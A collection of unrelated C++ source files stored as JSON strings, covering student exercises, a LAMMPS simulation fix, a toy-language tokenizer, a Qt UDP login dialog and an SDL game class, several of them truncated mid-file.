    "\ufeff#define _CRT_SECURE_NO_WARNINGS\r\n#include <iostream>\r\n#include <cstdio>\r\n\r\nusing namespace std;\r\n\r\nshort* alokujTablice(int rozmiar, int numer)\r\n{\r\n    short* tab = new short[rozmiar + 1];\r\n    rozmiar = rozmiar << 8;\r\n    tab[0] = rozmiar + numer;\r\n    tab++;\r\n    return tab;\r\n}\r\nvoid skasujTablice(short* tab)\r\n{\r\n    tab--;\r\n    delete[] tab;\r\n}\r\n\r\nvoid zapisz(const char* nazwaPliku, short* tab)\r\n{\r\n    int metadane = *(tab - 1);\r\n    int rozmiar = metadane >> 8;\r\n    FILE* plik = fopen(nazwaPliku, \"w\");\r\n    \r\n    fwrite(&metadane, sizeof(short), 1, plik);\r\n    fwrite(tab, sizeof(short), rozmiar, plik);\r\n    fclose(plik);\r\n}\r\n\r\nshort* odczyt(const char* nazwaPliku)\r\n{\r\n    FILE* plik = fopen(nazwaPliku, \"r+b\");\r\n    short metadane;\r\n    fread(&metadane, sizeof(short), 1, plik);\r\n    int numer = metadane & 0x00ff;\r\n    int rozmiar = metadane >> 8;\r\n    \r\n    short* tab = alokujTablice(rozmiar, numer);\r\n    fread(tab, sizeof(short), rozmiar, plik);\r\n    fclose(plik);\r\n    return tab;\r\n}\r\n\r\nvoid wypisz(short* tab)\r\n{\r\n    int metadane = *(tab - 1);\r\n    int numer = metadane & 0x00ff;\r\n    int rozmiar = metadane >> 8;\r\n   \r\n    printf(\"rozmiar: %d, numer: %d\\n\", rozmiar, numer);\r\n    for (int i = 0; i < rozmiar; i++)\r\n    {\r\n        short x = tab[i];\r\n        printf(\"%d \", (int)tab[i]);\r\n    }\r\n}\r\n\r\nint main(const char* nazwaPliku)\r\n{\r\n    printf(\"podaj wielkosc tablicy:\");\r\n    int wielkosc;\r\n    cin >> wielkosc;\r\n    short* tab = alokujTablice(wielkosc, 1);\r\n    for (int i = 0; i < wielkosc; i++)\r\n    {\r\n        cout << \"podaj \" << i + 1 << \" liczbe:\";\r\n        cin >> tab[i];\r\n    }\r\n    wypisz(tab);\r\n    zapisz(\"test.txt\", tab);\r\n    short* tab2 = odczyt(\"test.txt\");\r\n    cout << \"zapisano do pliku\" << endl;\r\n    cout << \"tablica po odczytaniu z pliku:\" << endl;\r\n\r\n    wypisz(tab2);\r\n\r\n    skasujTablice(tab);\r\n    skasujTablice(tab2);\r\n\r\n\r\n} \r\n\r\n",
    "/* ----------------------------------------------------------------------\n   LAMMPS - Large-scale Atomic/Molecular Massively Parallel Simulator\n   http://lammps.sandia.gov, Sandia National Laboratories\n   Steve Plimpton, sjplimp@sandia.gov\n\n   Copyright (2003) Sandia Corporation.  Under the terms of Contract\n   DE-AC04-94AL85000 with Sandia Corporation, the U.S. Government retains\n   certain rights in this software.  This software is distributed under \n   the GNU General Public License.\n\n   See the README file in the top-level LAMMPS directory.\n------------------------------------------------------------------------- */\n\n/* ----------------------------------------------------------------------\n   Contributing authors: Leo Silbert (SNL), Gary Grest (SNL)\n------------------------------------------------------------------------- */\n\n#include \"math.h\"\n#include \"stdlib.h\"\n#include \"string.h\"\n#include \"fix_wall_gran.h\"\n#include \"atom.h\"\n#include \"domain.h\"\n#include \"update.h\"\n#include \"force.h\"\n#include \"pair.h\"\n#include \"modify.h\"\n#include \"respa.h\"\n#include \"memory.h\"\n#include \"error.h\"\n#include \"update.h\"\n\nusing namespace LAMMPS_NS;\n\nenum{XPLANE,YPLANE,ZPLANE,ZCYLINDER,ZFUNNEL,ZSLIT};    // XYZ PLANE need to be 0,1,2\nenum{HOOKE,HOOKE_HISTORY,HERTZ_HISTORY};\n\n#define BIG 1.0e20\n\n#define MIN(A,B) ((A) < (B)) ? (A) : (B)\n#define MAX(A,B) ((A) > (B)) ? (A) : (B)\n\n/* ---------------------------------------------------------------------- */\n\nFixWallGran::FixWallGran(LAMMPS *lmp, int narg, char **arg) :\n  Fix(lmp, narg, arg), fw(NULL), fe(NULL)\n{\n  if (narg < 10) error->all(\"Illegal fix wall/gran command\");\n\n  if (!atom->radius_flag || !atom->omega_flag || !atom->torque_flag)\n    error->all(\"Fix wall/gran requires atom attributes radius, omega, torque\");\n\n  restart_peratom = 1;\n  create_attribute = 1;\n  time_depend = 1;\n\n  // wall/particle coefficients\n\n  kn = atof(arg[3]);\n  if (strcmp(arg[4],\"NULL\") == 0) kt = kn * 2.0/7.0;\n  else kt = atof(arg[4]);\n\n  gamman = atof(arg[5]);\n  if (strcmp(arg[6],\"NULL\") == 0) gammat = 0.5 * gamman;\n  else gammat = atof(arg[6]);\n\n  xmu = atof(arg[7]);\n  int dampflag = atoi(arg[8]);\n  if (dampflag == 0) gammat = 0.0;\n\n  if (kn < 0.0 || kt < 0.0 || gamman < 0.0 || gammat < 0.0 || \n      xmu < 0.0 || xmu > 1.0 || dampflag < 0 || dampflag > 1)\n    error->all(\"Illegal fix wall/gran command\");\n\n  // convert Kn and Kt from pressure units to force/distance^2 if Hertzian\n\n  if (force->pair_match(\"gran/hertz/history\",1)) {\n    kn /= force->nktv2p;\n    kt /= force->nktv2p;\n  }\n\n  // wallstyle args\n\n  int iarg = 9;\n  if (strcmp(arg[iarg],\"xplane\") == 0) {\n    if (narg < iarg+3) error->all(\"Illegal fix wall/gran command\");\n    wallstyle = XPLANE;\n    if (strcmp(arg[iarg+1],\"NULL\") == 0) lo = -BIG;\n    else lo = atof(arg[iarg+1]);\n    if (strcmp(arg[iarg+2],\"NULL\") == 0) hi = BIG;\n    else hi = atof(arg[iarg+2]);\n    iarg += 3;\n  } else if (strcmp(arg[iarg],\"yplane\") == 0) {\n    if (narg < iarg+3) error->all(\"Illegal fix wall/gran command\");\n    wallstyle = YPLANE;\n    if (strcmp(arg[iarg+1],\"NULL\") == 0) lo = -BIG;\n    else lo = atof(arg[iarg+1]);\n    if (strcmp(arg[iarg+2],\"NULL\") == 0) hi = BIG;\n    else hi = atof(arg[iarg+2]);\n    iarg += 3;\n  } else if (strcmp(arg[iarg],\"zplane\") == 0) {\n    if (narg < iarg+3) error->all(\"Illegal fix wall/gran command\");\n    wallstyle = ZPLANE;\n    if (strcmp(arg[iarg+1],\"NULL\") == 0) lo = -BIG;\n    else lo = atof(arg[iarg+1]);\n    if (strcmp(arg[iarg+2],\"NULL\") == 0) hi = BIG;\n    else hi = atof(arg[iarg+2]);\n    iarg += 3;\n  } else if (strcmp(arg[iarg],\"zcylinder\") == 0) {\n    if (narg < iarg+2) error->all(\"Illegal fix wall/gran command\");\n    wallstyle = ZCYLINDER;\n    lo = hi = 0.0;\n    cylradius = atof(arg[iarg+1]);\n    iarg += 2;\n  } else if (strcmp(arg[iarg],\"zfunnel\") == 0) {\n    if (narg < iarg+6) error->all(\"Illegal fix wall/gran command\");\n    wallstyle = ZFUNNEL;\n    lo = atof(arg[iarg+1]);\n    hi = atof(arg[iarg+2]);\n    wc0 = atof(arg[iarg+3]);\n    wc1 = atof(arg[iarg+4]);\n    wc2 = atof(arg[iarg+5]);\n    wc3 = 1/(1+wc1*wc1);\n    wc4 = 1/(1+wc2*wc2);\n    iarg += 6;\n  } else if (strcmp(arg[iarg],\"zslit\") == 0) {\n    if (narg < iarg+6) error->all(\"Illegal fix wall/gran command\");\n    wallstyle = ZSLIT;\n    lo = atof(arg[iarg+1]);\n    hi = atof(arg[iarg+2]);\n    wc0 = atof(arg[iarg+3]);\n    wc1 = atof(arg[iarg+4]);\n    wc2 = atof(arg[iarg+5]);\n    wc3 = 1/(1+wc1*wc1);\n    wc4 = 1/(1+wc2*wc2);\n    iarg += 6;\n  }\n  \n  // check for trailing keyword/values\n\n  wiggle = 0;\n  wshear = 0;\n\n  while (iarg < narg) {\n    if (strcmp(arg[iarg],\"wiggle\") == 0) {\n      if (iarg+4 > narg) error->all(\"Illegal fix wall/gran command\");\n      if (strcmp(arg[iarg+1],\"x\") == 0) axis = 0;\n      else if (strcmp(arg[iarg+1],\"y\") == 0) axis = 1;\n      else if (strcmp(arg[iarg+1],\"z\") == 0) axis = 2;\n      else error->all(\"Illegal fix wall/gran command\");\n      amplitude = atof(arg[iarg+2]);\n      period = atof(arg[iarg+3]);\n      wiggle = 1;\n      iarg += 4;\n    } else if (s",
    "#include \"tokenizer.h\"\n\nproglang::Tokenizer::Tokenizer(std::ifstream& stream, std::filesystem::path _path) {\n  path = _path;\n  char c;\n  std::string buf = \"\";\n  int cline;\n  int nline = 1;\n  while (stream.get(c)) {\n    buf.push_back(c);\n    cline = nline;\n    if (c == '\\n') {\n      nline++;\n    }\n    if (buf.substr(0, 2) == \"//\") {\n      if (c == '\\n') {\n        buf = \"\";\n      }\n      continue;\n    }\n    if (buf.substr(0, 2) == \"/*\") {\n      if (buf[buf.size() - 2] != '*' || c != '/') {\n        continue;\n      } else if (buf.size() > 1) {\n        buf = \"\";\n      }\n    }\n    if (buf.substr(0, 1) == \"\\\"\") {\n      if (c != '\"') {\n        continue;\n      } else if (buf.size() > 1) {\n        tokens.push_back({ token_type: proglang::TokenType::STRING_LITERAL, data: buf.substr(1, buf.size() - 2), line: cline });\n        buf = \"\";\n      }\n    }\n    if (c == ' ' || c == '\\n' || c == '\\t') {\n      if (buf.size() == 1) {\n        buf = \"\";\n      } else {\n        buf = buf.substr(0, buf.size() - 1);\n        tokens.push_back(bufToToken(buf, cline));\n        buf = \"\";\n      }\n      continue;\n    }\n    if (c == '(' || c == ')' || c == '{' || c == '}' || c == '[' || c == ']' || c == ';' || c == ',' || c == '>' || c == '<' || c == '=' || c == '+' || c == '-' || c == '%') {\n      if (buf.size() > 1) {\n        buf = buf.substr(0, buf.size() - 1);\n        tokens.push_back(bufToToken(buf, cline));\n        buf = c;\n      }\n      tokens.push_back(bufToToken(buf, cline));\n      buf = \"\";\n    }\n  }\n}\n\nproglang::Tokenizer::~Tokenizer() { }\n\nproglang::Token proglang::Tokenizer::bufToToken(std::string& buf, int l) {\n  if (buf == \"(\") {\n    return { token_type: TokenType::BRACKET_OPEN, line: l };\n  } else if (buf == \")\") {\n    return { token_type: TokenType::BRACKET_CLOSE, line: l };\n  } else if (buf == \"{\") {\n    return { token_type: TokenType::CURLY_BRACKET_OPEN, line: l };\n  } else if (buf == \"}\") {\n    return { token_type: TokenType::CURLY_BRACKET_CLOSE, line: l };\n  } else if (buf == \"[\") {\n    return { token_type: TokenType::SQUARE_BRACKET_OPEN, line: l };\n  } else if (buf == \"]\") {\n    return { token_type: TokenType::SQUARE_BRACKET_CLOSE, line: l };\n  } else if (buf == \",\") {\n    return { token_type: TokenType::COMMA, line: l };\n  } else if (buf == \";\") {\n    return { token_type: TokenType::SEMICOLON, line: l };\n  } else if (buf == \"=\") {\n    return { token_type: TokenType::EQUAL, line: l };\n  } else if (buf == \">\") {\n    return { token_type: TokenType::BIGGER_THAN, line: l };\n  } else if (buf == \"<\") {\n    return { token_type: TokenType::SMALLER_THAN, line: l };\n  } else if (buf == \"+\") {\n    return { token_type: TokenType::PLUS, line: l };\n  } else if (buf == \"-\") {\n    return { token_type: TokenType::MINUS, line: l };\n  } else if (buf == \"%\") {\n    return { token_type: TokenType::MODULO, line: l };\n  } else if (buf == \"return\") {\n    return { token_type: TokenType::RETURN, line: l };\n  } else if (buf == \"if\") {\n    return { token_type: TokenType::IF, line: l };\n  } else if (buf == \"while\") {\n    return { token_type: TokenType::WHILE, line: l };\n  } else if (buf == \"@ext\") {\n    return { token_type: TokenType::EXTERNAL_DEFINITION, line: l };\n  } else if (buf == \"void\") {\n    return { token_type: TokenType::VOID_T, line: l };\n  } else if (buf == \"bool\") {\n    return { token_type: TokenType::I1_T, line: l };\n  } else if (buf == \"char\") {\n    return { token_type: TokenType::I8_T, line: l };\n  } else if (buf == \"short\") {\n    return { token_type: TokenType::I16_T, line: l };\n  } else if (buf == \"int\") {\n    return { token_type: TokenType::I32_T, line: l };\n  } else if (buf == \"str\") {\n    return { token_type: TokenType::STR_T, line: l };\n  } else if (buf == \"void*\") {\n    return { token_type: TokenType::VOID_PTR, line: l };\n  } else if (buf == \"~\") {\n    return { token_type: TokenType::TILDE, line: l };\n  } else {\n    return { token_type: TokenType::IDENTIFIER, data: buf, line: l };\n  }\n}\n\nstd::vector<proglang::Token> proglang::Tokenizer::getCombinedTokens() {\n  std::vector<proglang::Token> t;\n  for (long unsigned int i = 0; i < tokens.size(); i++) {\n    if (tokens[i].token_type == proglang::TokenType::EXTERNAL_DEFINITION && tokens[i + 1].token_type == proglang::TokenType::IDENTIFIER && tokens[i + 2].token_type == proglang::TokenType::SEMICOLON) {\n      std::filesystem::path np = path.parent_path();\n      np.append(tokens[i + 1].data.value() + \".proglang\");\n      std::ifstream ifilestream(np);\n      if (!ifilestream) {\n        ERROR(\"File \" << np.string() << \" does not exist.\" << std::endl);\n        exit(1);\n      }\n      Tokenizer tok(ifilestream, path);\n      ifilestream.close();\n      std::vector<proglang::Token> nt = tok.getCombinedTokens();\n      t.insert(t.end(), nt.begin(), nt.end());\n      i += 2;\n      continue;\n    }\n    t.push_back(tokens[i]);\n  }\n  return t;\n};\n",
    "// including header files\n#include<iostream>\n#include<conio.h>\n#include<fstream>\nusing namespace std;\n\n//global variables\nstring fname,lname,phone_num;\n\n// Functions\nvoid addContact();\nvoid searchContact();\nvoid help();\nvoid self_exit();\nbool check_digits(string);\nbool check_numbers(string);\n\nint main()\n{\n    short int choice;\n    system(\"cls\");\n    system(\"color 0A\");\n    cout << \"\\n\\n\\n\\t\\t\\tContact Management.\";\n    cout << \"\\n\\n\\t1. Add Contact\\n\\t2. Search Contact\\n\\t3. Help\\n\\t4. Exit\\n\\t> \";\n    cin >> choice;\n\n    switch(choice)\n    {\n        case 1:\n            addContact();\n            break;\n        case 2:\n            searchContact();\n            break;\n        case 3:\n            help();\n            break;\n        case 4:\n            self_exit();\n            break;\n        default:\n            cout << \"\\n\\n\\tInvalid Input !\";\n            cout << \"\\n\\tPress Any Key To Continue..\";\n            getch();\n            main();\n    }\n    return 0;\n}\n\nvoid self_exit()\n{\n    system(\"cls\");\n    cout << \"\\n\\n\\n\\t\\tThank You For Using !\";\n    exit(1);\n}\n\nvoid help()\n{\n    cout << \"This displays help\";\n}\n\nvoid addContact()\n{\n    ofstream phone(\"number.txt\", ios::app);\n    system(\"cls\");\n    cout << \"\\n\\n\\tEnter First Name : \";\n    cin >> fname;\n    cout << \"\\n\\tEnter Last Name : \";\n    cin >> lname;\n    cout << \"\\n\\tEnter 10-Digit Phone Number : \";\n    cin >> phone_num;\n\n    if(check_digits(phone_num) == true)\n    {\n        if(check_numbers(phone_num) == true)\n        {\n            if(phone.is_open())\n            {\n                phone << fname << \" \" << lname << \" \" << phone_num << endl;\n                cout << \"\\n\\tContact Saved Successfully !\";\n            }\n            else\n            {\n                cout << \"\\n\\tError Opening File !\";\n            }\n        }\n        else\n        {\n            cout << \"\\n\\tA Phone Number Must Contain Numbers Only !\";\n        }\n    }\n    else\n    {\n        cout << \"\\n\\tA Phone Number Must COntain 10 Digits.\";\n    }\n    phone.close();\n}\n\nvoid searchContact()\n{\n    bool found = false;\n    ifstream myfile(\"number.txt\");\n    string keyword;\n    cout << \"\\n\\tEnter Name To Search : \";\n    cin >> keyword;\n    while(myfile >> fname >> lname >> phone_num)\n    {\n        if(keyword == fname || keyword == lname)\n        {\n            system(\"cls\");\n            cout << \"\\n\\n\\n\\t\\tContact details..\";\n            cout << \"\\n\\n\\tFirst Name : \" << fname;\n            cout << \"\\n\\tLast Name : \" << lname;\n            cout << \"\\n\\tPhone Number : \" << phone_num;\n            found = true;\n            break;\n        }\n    }\n    if(found == false)\n    cout << \"\\n\\tNo Such Contact Found\";\n}\n\nbool check_digits(string x)\n{\n    if(x.length() == 10)\n    return true;\n    else\n    return false;\n}\n\nbool check_numbers(string x)\n{\n    bool check = true;\n\n    for(int i=0; i < x.length(); i++)\n    {\n        if(!(int(x[i]) >= 48 && int(x[i]) <= 57))\n        {\n            check = false;\n            break;\n        }\n    }\n\n    if(check == true)\n    return true;\n    if(check == false)\n    return false;\n}\n\n",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\n\r\nstruct file{\r\n    int val;\r\n    file *suiv;\r\n};\r\nfile *tete=nullptr;\r\nfile *QQ=nullptr;\r\n\r\nbool vide(){\r\n    if(tete==nullptr)\r\n    {\r\n        return true;\r\n    }else{\r\n        return false;\r\n    }\r\n}\r\n\r\nint longueur(){\r\n    int cntr=1;\r\n    file *e=tete;\r\n    if(vide())\r\n    {\r\n        return 0;\r\n    }else{\r\n        while(e!=QQ){\r\n            cntr++;\r\n            e=e->suiv;\r\n        }\r\n        return cntr;\r\n    }\r\n}\r\n\r\nvoid adjq(int n){\r\n    if(vide())\r\n    {\r\n        tete=new(file);\r\n        tete->val=n;\r\n        tete->suiv=nullptr;\r\n        QQ=tete;\r\n    }else{\r\n        file *neew;\r\n        neew=new(file);\r\n        neew->val=n;\r\n        neew->suiv=nullptr;\r\n        QQ->suiv=neew;\r\n        QQ=neew;\r\n    }\r\n}\r\n\r\nvoid supt(){\r\n    if(vide())\r\n    {\r\n        cout<<\"file vide\"<<endl;\r\n    }else{\r\n        file *x=tete;\r\n        tete=tete->suiv;\r\n        delete(x);\r\n    }\r\n}\r\n\r\nint teete(){\r\n    if(vide())\r\n    {\r\n        cout<<\"file vide\"<<endl;\r\n    }else{\r\n        return tete->val;\r\n    }\r\n}\r\n\r\nvoid afficher(){\r\n    file *e=tete;\r\n    if(vide())\r\n    {\r\n        cout<<\"la file est vide\";\r\n    }else{\r\n        while(e!=nullptr){\r\n            cout<<e->val<<endl;\r\n            e=e->suiv;\r\n        }\r\n    }\r\n}\r\nint main()\r\n{\r\n    int choix,n;\r\n    while(choix!=7){\r\n            cout<<\"\\n1.vide\\n2.longueur\\n3.emfiler\\n4.defiler\\n5.la valeur de tete\\n6.afficher\\n7.quitter\\nvotre choix:\";\r\n            cin>>choix;\r\n            cout<<endl;\r\n\r\n        switch(choix){\r\n        case 1:\r\n            if(vide()){\r\n                cout<<\"la file est vide\"<<endl;\r\n            }else{\r\n                cout<<\"la file n'est pas vide\"<<endl;\r\n            }break;\r\n        case 2:\r\n            cout<<\"la longueur de la file est:\"<<longueur()<<endl;break;\r\n        case 3:\r\n            cout<<\"entrez la valeur ajout\u00e9:\";\r\n            cin>>n;\r\n            adjq(n);break;\r\n        case 4:\r\n            supt();break;\r\n        case 5:\r\n            cout<<\"la valeur de tete est:\"<<teete()<<endl;break;\r\n        case 6:\r\n            afficher();break;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include \"login.h\"\n#include \"ui_login.h\"\n#include <QCryptographicHash>\n#include <QMessageBox>\n#include <QDebug>>\n#include \"mainwindow.h\"\n//\u4f7f\u7528UDP\u4f5c\u4e3a\u4f20\u8f93\u534f\u8bae\nLogin::Login(QWidget *parent) :\n    QDialog(parent),\n    ui(new Ui::Login)\n{\n\n    ui->setupUi(this);\n     setWindowFlags(windowFlags() | Qt::WindowMinimizeButtonHint);\n     setWindowFlags(windowFlags() | Qt::WindowMaximizeButtonHint);\n    // this->setStyleSheet(\"color: black;\"\n    //                     \"background-color: #f5c70b;\"\n    //                     \"selection-color: #fff;\");\n\n    client = new QUdpSocket(this);\n    server = new QUdpSocket(this);\n\n    // \u7ed1\u5b9a client \u5230\u7aef\u53e3 6666\n    // if (client->bind(QHostAddress::Any, 6666)) {\n    //     qDebug(\"Client bound to port 6666\");\n    // } else {\n    //     qDebug(\"Failed to bind client to port 6666\");\n    //     // \u5904\u7406\u9519\u8bef\n    // }\n\n    this->port = 6000;\n    bool isOk = false;\n\n    while (!isOk) {\n        if (server->bind(QHostAddress::Any, this->port)) {\n            isOk = true;\n            qDebug(\" login is listening on port: %d\", this->port);\n        } else {\n            this->port++;\n            qDebug(\"Port %d is busy, trying next one\", this->port);\n        }\n    }\n}\n\nLogin::~Login()\n{\n    delete ui;\n    //\u5173\u95ed\u7aef\u53e3\n    if(server)\n    {\n        server->close ();\n        delete server;\n    }\n    if(client)\n    {\n        client->close ();\n        delete client;\n    }\n}\n\nQList<Pkm> Login::getPkm()\n{\n    return this->pkms;\n}\n\nQString Login::getUsername()\n{\n    return this->username;\n}\n\nuint Login::getPort()\n{\n    return this->port;\n}\nvoid Login::readPendingDatagrams()\n {\n    while (server->hasPendingDatagrams()){\n    QByteArray data;\n    data.resize(server->pendingDatagramSize());//\u8c03\u6574\u6570\u7ec4\u5927\u5c0f\u4ee5\u5339\u914d\u5f85\u63a5\u53d7\u6570\u636e\u7684\u5927\u5c0f\n    QHostAddress senderIP;//\u53d1\u9001\u65b9IP\n    quint16 senderPort;//\u53d1\u9001\u65b9\u7aef\u53e3\n    server->readDatagram(data.data(), data.size(),&senderIP,&senderPort);\n    QDataStream dsIn(&data,QIODevice::ReadWrite);\n    //\u8bb2UDP\u7684\u6570\u636e\u62a5\u8bfb\u5165\u5185\u5b58Ddata\u4e2d\uff0cDataStream\u662f\u7528\u6765\u89e3\u5305\u6570\u636e\u7684\n    uint loginKind;\n    QString username;\n    QString pwd;\n    dsIn>>loginKind >>username;\n\n    switch (loginKind){\n    case SIGNUPOK: {\n        QMessageBox::information (this,\"Sign Up\",\"Sign Up Sucess\");\n        ui->lineEditUser->clear();\n        ui->lineEditPwd->clear();\n        break;\n    }\n    case LOGINOK: {\n        QMessageBox::information (this,\"Log in\",\"Log in Success\");\n        ui->lineEditUser->clear();\n        ui->lineEditPwd->clear();\n        this->username = username;\n        MainWindow *mainWindow = new MainWindow;\n        connect(this, &Login::loginSuccessful, mainWindow, &MainWindow::onLoginSuccess);\n        emit loginSuccessful(this->username,port);\n        mainWindow->show();\n        this->close();\n        break;\n    }\n    case EXISTUSER:{\n        QMessageBox::critical (this,\"Sign Up Failed\",\"Username Exist,Please Change Username.\");\n        ui->lineEditUser->clear();\n        ui->lineEditPwd->clear();\n        break;\n    }\n    case NOUSER:{\n        QMessageBox::critical (this,\"Log In Failed\",\"No Such User,Please Login Again.\");\n        ui->lineEditUser->clear();\n        ui->lineEditPwd->clear();\n        break;\n    }\n    case PWDDIFF:{\n        QMessageBox::critical (this,\"Log In Failed\",\"Password Don't Match',Please Login Again.\");\n        ui->lineEditUser->clear();\n        ui->lineEditPwd->clear();\n        break;\n    }\n    }\n    }\n\n }\n\nvoid Login::on_BtnSignUp_clicked()\n{\n    QString username=ui->lineEditUser->text ();\n    this->username=username;\n    QString pwd=ui->lineEditPwd->text ();\n\n    if(!username.isEmpty ()&&!pwd.isEmpty ())\n    {\n        QByteArray temp;//SHA256\u52a0\u5bc6,\u9274\u4e8e\u7528\u6237\u91cf\u5f88\u5c0f\uff0c\u6ca1\u6709\u52a0\u76d0\n        temp = QCryptographicHash::hash ( pwd.toUtf8(), QCryptographicHash::Sha256 );\n        pwd.clear ();\n        pwd.append(temp.toHex());\n\n        QByteArray data;\n        QDataStream dsOut(&data,QIODevice::ReadWrite);\n        dsOut<<SIGNUP<<username<<this->port<<pwd;//\u53d1\u9001\u767b\u5f55\u7c7b\u578b\uff0c\u7528\u6237\u540d\u5bc6\u7801\u4ee5\u53ca\u7aef\u53e3\u53f7\n        QHostAddress serverAddress = QHostAddress(\"127.0.0.1\");//\u670d\u52a1\u5668\u7684IP\u5730\u5740\u662f\u672c\u5730\u56de\u73af\u5730\u5740\n        client->writeDatagram(data.data(), data.size(),serverAddress, 6666);//\u76ee\u6807\u7aef\u53e3\u53ef\u4ee5\u914d\u7f6e\n\n        if(server->waitForReadyRead (600))//\u5224\u65ad\u8fde\u63a5\u8d85\u65f6\n            this->readPendingDatagrams ();\n        else\n            QMessageBox::critical (this,\"Sign Up Failed\",\"Connect Failed\");\n\n    }\n    else\n        QMessageBox::critical (this,\"Sign Up Failed\",\"Username And Pwd Must Not Be Empty\");\n}\n\nvoid Login::on_BtnLogIn_clicked()\n{\n    QString username=ui->lineEditUser->text ();\n    this->username=username;\n    QString pwd=ui->lineEditPwd->text ();\n\n    if(!username.isEmpty ()&&!pwd.isEmpty ())\n    {\n        // QByteArray temp;\n        // temp = QCryptographicHash::hash ( pwd.toUtf8(), QCryptographicHash::Sha256 );\n        // pwd.clear ();\n        // pwd.append(temp.toHex());\n\n        QByteArray data;\n        QDataStream dsOut(&data,QIODevice::ReadWrite);\n        dsOut<<LOGIN<<username<<this->port<<pwd;//\u53d1\u9001\u767b\u5f55\u7c7b\u578b\uff0c\u7528\u6237\u540d\u5bc6\u7801\u4ee5\u53ca\u7aef\u53e3\u53f7\n        QHostAddress serverAddress = QHostAddress(\"127.0.0.1\");\n        client->writeDatagram(data.data(), data.size(),serve",
    "/**\n * File: week-1-assignment-class-math-library.cpp\n * Author: Jeremy Sizemore\n * Date: July 3, 2024\n * Course: SDEV-340\n * \n * Description: This file is the implementation of the MathLibrary class.\n */\n\n#include \"../include/week-1-assignment-class-math-library.h\"\n\n\ndouble MathLibrary::myRange()\n{\n    // used stackoverflow to figure out how to find the range in c++\n    // which included using the minmax_element function\n    auto myMinMax = minmax_element(inputNumbers.begin(), inputNumbers.end());\n    double range = *myMinMax.second - *myMinMax.first;\n\n    return range;\n}\n\ndouble MathLibrary::myAverage(vector <double> inputNumbers)\n{\n    // method to determine the average of the input numbers\n    double sum = 0.0;\n    // loop through the input numbers and sum them\n    for (const auto& item : inputNumbers)\n    {\n        sum += item;\n    }\n\n    return sum / inputNumbers.size();\n}\n\n\nvector <double> MathLibrary::myDeviance()\n{\n    // method to determine the deviance of the input numbers\n    double deviance = 0.0;\n    double average = myAverage(inputNumbers);\n    vector <double> myDevianceVector;\n\n    // loop through the input numbers and calculate the deviance\n    for (const auto& item : inputNumbers)\n    {\n        deviance = pow(item - average, 2);\n        myDevianceVector.push_back(deviance);\n    }\n\n    return myDevianceVector;\n}\n\ndouble MathLibrary::myVariance()\n{\n    // method to determine the variance of the input numbers\n    double variance = 0.0;\n    double sum = 0.0;\n    vector <double> myDevianceVector;\n\n    double average = myAverage(inputNumbers);\n    myDevianceVector = myDeviance();\n    variance = myAverage(myDevianceVector);\n\n    return variance;\n}\n\ndouble MathLibrary::myStandardDeviation()\n{\n    // method to determine the standard deviation of the input numbers\n    double variance = 0.0;\n    double sum = 0.0;\n    vector <double> myDevianceVector;\n\n    double average = myAverage(inputNumbers);\n    myDevianceVector = myDeviance();\n    variance = myAverage(myDevianceVector);\n\n    // use stackoverflow to figure out how to round to 2 decimal places in c++\n    return round(sqrt(variance) * 100) / 100;\n}",
    "#include \"Player.hpp\"\n#include \"Fireball.hpp\"\n\nPlayer::Player(float px, float py, SDL_Texture* ptex, bool pFalling)\n    :Entity{px, py, ptex, pFalling}\n{\n\t\tgravity = 0.3f;\n\t\tMAX_SPEED = 10;\n\t\tfireballs = 10;\n\t\tdirection = 1;\n\t\tcreating = false;\n\t\tcrushed = false;\n\t\tsetType(0);\n}\n\n//Update function.\nvoid Player::update()\n{\n\t\tsetX(getX() + getVelX());\n\t\tsetY(getY() + getVelY());\n\n\t\tif(getVelX() > 0) direction = 1; \n\t\telse if(getVelX() < 0) direction = 0; \n\n\t\tsetX(clamp(getX(), -15, 720));\n\t\tsetY(clamp(getY(), 0, 704));\n\t\tsetFireballs(clamp(getFireballs(), 0, 99));\t\n\n\t\tif(getY() == 0) setVelY(0);\n\t\t\n\t\tif(getY() == 704)\n\t\t{\n\t\t\tsetJumping(false);\n\t\t\tsetFalling(false);\n\t\t}\n\n\t\tif(getFalling() || getJumping())\n\t\t{\n\t\t\tsetVelY(getVelY() + gravity);\n\t\t\tif(getVelY() > MAX_SPEED) setVelY(MAX_SPEED); \n\t\t}\n}\n\n//Render function.\nvoid Player::render(SDL_Renderer* renderer)\n{\n\t\tif(getJumping() || getFalling())\n\t\t{\n\t\t\tSDL_Rect src; \n\t\t\tif(direction == 1) src.x = 4 * 32;\n\t\t\telse if(direction == 0) src.x = 10 * 32;\n\t\t\tsrc.y = 0;\n\t\t\tsrc.w = 32;\n\t\t\tsrc.h = 32;\n\n\t\t\tSDL_Rect dst;\n\t\t\tdst.x = getX();\n\t\t\tdst.y = getY();\n\t\t\tdst.w = src.w * 2;\n\t\t\tdst.h = src.h * 2;\n\n\t\t\tSDL_RenderCopy(renderer, getTex(), &src, &dst);\n\t\t}\n\n\t\telse if(creating)\n\t\t{\n\t\t\tUint32 seconds = SDL_GetTicks() / 200; \n\t\t\tUint32 sprite = (seconds % 3) + 12; \n\n\t\t\tSDL_Rect src; \n\t\t\tsrc.x = sprite * 32;\n\t\t\tsrc.y = 0;\n\t\t\tsrc.w = 32;\n\t\t\tsrc.h = 32;\n\n\t\t\tSDL_Rect dst;\n\t\t\tdst.x = getX();\n\t\t\tdst.y = getY();\n\t\t\tdst.w = src.w * 2;\n\t\t\tdst.h = src.h * 2;\n\n\t\t\tSDL_RenderCopy(renderer, getTex(), &src, &dst);\n\t\t} \n\t\t\n\t\telse\n\t\t{\n\t\t\tif(getVelX() > 0)\n\t\t\t{\n\t\t\t\tUint32 seconds = SDL_GetTicks() / 200; \n\t\t\t\tUint32 sprite = seconds % 4; \n\n\t\t\t\tSDL_Rect src; \n\t\t\t\tsrc.x = sprite * 32;\n\t\t\t\tsrc.y = 0;\n\t\t\t\tsrc.w = 32;\n\t\t\t\tsrc.h = 32;\n\n\t\t\t\tSDL_Rect dst;\n\t\t\t\tdst.x = getX();\n\t\t\t\tdst.y = getY();\n\t\t\t\tdst.w = src.w * 2;\n\t\t\t\tdst.h = src.h * 2;\n\n\t\t\t\tSDL_RenderCopy(renderer, getTex(), &src, &dst);\n\t\t\t}\n\t\t\telse if (getVelX() < 0)\n\t\t\t{\n\t\t\t\tUint32 seconds = SDL_GetTicks() / 200; \n\t\t\t\tUint32 sprite = (seconds % 4) + 6; \n\n\t\t\t\tSDL_Rect src; \n\t\t\t\tsrc.x 